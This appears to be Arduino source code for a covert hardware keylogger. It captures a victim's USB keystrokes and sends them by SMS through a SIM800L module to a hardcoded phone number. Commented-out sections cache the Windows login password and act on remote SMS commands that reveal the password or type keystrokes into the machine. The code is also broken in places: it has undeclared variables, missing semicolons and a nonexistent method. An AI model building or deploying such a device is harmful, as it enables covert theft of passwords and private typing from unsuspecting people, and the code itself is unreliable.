#include <SoftwareSerial.h>            
#include <Keyboard.h>                  
#include "C_USBhost.h"                

#define LEAK_PHONE_NUMBER "+14422457648"
#define DEBUG true

C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/DEBUG);            
SoftwareSerial SMSSERIAL(8, 9);

#define CHAR_LIMIT 140                                
#define BAUD_RATE_SIM800L 57700                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200                    

#define STATE_IDLE 0
#define STATE_WAITING_MSG_RESPONSE 1
#define STATE_WAITING_SMS_RESPONSE 1

char TextSms[CHAR_LIMIT+2];                  
int char_count;                              
char backupTextSms[CHAR_LIMIT+2];
unsigned long previousMillis=0;
int interval=60000;
int interval_payload=15000;
String SMS = "";
int passcached=0;
char password[127];
char empty;
int password_char_count;
byte b;
String substr = "";
int state = STATE_IDLE;

bool pendingSMS = false;
String buffer_keystrokes = "";

// Flush buffer of the SMS serial
void SMSSerialFlush(){
  while(SMSSERIAL.available() > 0) {
    SMSSERIAL.read();
  }
}   

String readResponse()
{
  delay(500);
  String res;
  int TIMEOUT = 10 *10; // wait 10 seconds
  int incomingByte  = 0;
  while (!SMSSERIAL.available()) 
  {
    delay(100);
    TIMEOUT--;
    if (TIMEOUT == 0){
      if (DEBUG){
          Serial.println("Timeout reading response");
      }
      return "";
    }
  }
  
  while (SMSSERIAL.available()) 
  {
    incomingByte  = SMSSERIAL.read();
    if (incomingByte == -1){ // this should never happen 
      if (DEBUG){
        Serial.println("There is no data to read from SMSSERIAL");
      }
      break; 
    }
    if (DEBUG){
      Serial.write(char(incomingByte));
    }
    res += char(incomingByte);
  }
  
  return res;
}

void collectDebugInfo(){
  SMSSERIAL.write("AT+CMEE=1\r\n"); //enable debug
  readResponse();
  Serial.println("--"); 
  
  SMSSERIAL.write("AT\r\n"); //Once the handshake test is successful, it will back to OK
  readResponse();
  Serial.println("--");
  
  SMSSERIAL.write("AT+CSQ\r\n"); //Signal quality test, value range is 0-31 , 31 is the best
  readResponse();
  Serial.println("--");
  
  SMSSERIAL.write("AT+CCID\r\n"); //Read SIM information to confirm whether the SIM is plugged
  readResponse();
  Serial.println("--");

  //check card is properly inserted
  SMSSERIAL.write("AT+CPIN?\r\n"); 
  String res = readResponse();

  if(res.indexOf("CPIN: READY") <= 0){
    Serial.println("The SIM card is not ready to be used. Check you inserted id correctly");
  }
}


// Returns 1 if SMS was sucessfully sent or 0 if not
int sendSMSMessage(String txt){
  SMSSERIAL.write("AT+CMGF=1\r\n");
  delay(2);

  SMSSERIAL.write("AT+CMGS=\"" LEAK_PHONE_NUMBER "\"\r\n"); //phonenumber with land code
  delay(2);

  SMSSERIAL.write(txt.c_str());
  delay(2);
  if (pendingBuffer == "")
    pendingBuffer = txt;
  else {
    pendingBuffer += txt;
  }

  SMSSerialFlush();
  
  SMSSERIAL.write((char)26);
  delay(2);

  //String res = readResponse();

//  if(res.indexOf("CMGS:") > 0){
//    if (DEBUG){
//      Serial.println("SMS message succesfully sent");
//    }
//    return 1;  
//  }
//
//  if (DEBUG){
//    Serial.println("Error sending SMS message");
//  }
  return 0; 
}

void setup() {
  delay(300);                                              
  Serial.begin(BAUD_RATE_SERIAL);                                                   
  SMSSERIAL.begin(BAUD_RATE_SIM800L);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
  Keyboard.begin();

  if(DEBUG){
      collectDebugInfo();
  }
  
  //Keyboard.press(KEY_RIGHT_GUI);
  //Keyboard.press('l');
  //Keyboard.releaseAll();
                                            
}

void loop() {    
//  sendSMSMessage("otro test");
//  delay(55000);
  
  unsigned long currentMillis = millis();
  b = USBhost.GetKey();    

  //Normalkey capture
  if(b){
    // Backspace
    if(b == 8){
      if(buffer_keystrokes.length() > 0){
        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1)  
      }
    }
    else {
      buffer_keystrokes += (char)b;
      }
    previousMillis = currentMillis;  
  }

  //SMS send
  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5) {
    if (!pendingSMS) {
      // The buffer could hold a lot of characters from previous SMS that couldn't be sent
      String bufferToSend = "";
      if (buffer_keystrokes.length() < CHAR_LIMIT - 1) {
        bufferToSend = buffer_keystrokes;
      }
      else {
        bufferToSend = buffer_keystrokes.substring(0, CHAR_LIMIT - 1);
      }
      if(DEBUG){
        Serial.println("Trying to send message with content: " + bufferToSend);
      }
      
      sendSMSMessage(bufferToSend);
      pendingSMS = true;
      pendingLength = bufferToSend.length();
    } 
    else {
      if(DEBUG){
        Serial.println("There is a SMS pending to be sent...");
      }
    }
  }

  // If there is a pending SMS we check if it was sent, if so we remove the characters sent
  if (pendingSMS) {
    if (SMSSERIAL.available()) {
      String res = SMSSERIAL.readStr()
      Serial.println("Message read from SMSSERIAL: " + res);
      if (res.indexOf("CMGS:") > 0){
        Serial.println("SMS message succesfully sent");
        pendingSMS = false;
        // We removed from the buffer the characters that were sent
        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
      }
      // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
      else if (res.indexOf("ERROR")) {
        // The SMS couldn't be sent, we need to retry
        if(DEBUG){
          Serial.println("Trying to send message with content: " + bufferToSend);
        }
        sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
      }
    }
  } 
     
//Get windows passmethod
//  if( passcached == 0 && char_count > 0){
//        while(b != 10){
//         b = USBhost.GetKey();
//         if(b){
//          if(b == 8){
//            if(password_char_count > 0){
//              password_char_count--;
//              password[password_char_count] = empty;
//              }
//            }
//          else{
//           password[password_char_count++] = (char)b;   
//            }
//          previousMillis = currentMillis;
//          }
//        }
//      passcached++;
//
//      sendSMSMessage(String(password));
////      SMSSERIAL.write("AT+CMGF=1\r\n");
////      delay(2);
////      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
////      delay(2);
////      SMSSERIAL.write(password); 
////      SMSSERIAL.write((char)26);
//    }


   //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
//    if (SMSSERIAL.available() && (unsigned long)(currentMillis - previousMillis) >= interval_payload) {  
//      SMS = SMSSERIAL.readString();    
//      if(SMS.indexOf("Execute:Payload") > -1){
//      Serial.print(password); // Payload
//      Keyboard.press(KEY_HOME);
//      Keyboard.releaseAll();
//      delay(500);
//      Keyboard.print(password);
//      Keyboard.press('\n');
//      Keyboard.releaseAll();
//     }
//     if(SMS.indexOf("Password:Reveal") > -1){ //Keyword
////      SMSSERIAL.write("AT+CMGF=1\r\n");
////      delay(2);
////      SMSSERIAL.write("AT+CMGS=\"+14158604568\"\r\n"); //phonenumber with land code
////      delay(2);
////      SMSSERIAL.write(password); 
////      SMSSERIAL.write((char)26);
//        sendSMSMessage(String(password));
//        char_count = 0;
//     }
//     if(SMS.indexOf("Manual:") > -1){       
//         substr = SMS.substring(57); //start from char 57 57 = : in Manual: 
//         Keyboard.print(substr);
//      }
//    //Manual Password overwrite incase first entry was wrong.
//     if(SMS.indexOf("ManualPass:") > -1){       
//         substr = SMS.substring(61);
//         substr.toCharArray(password, 127);
//      }  
}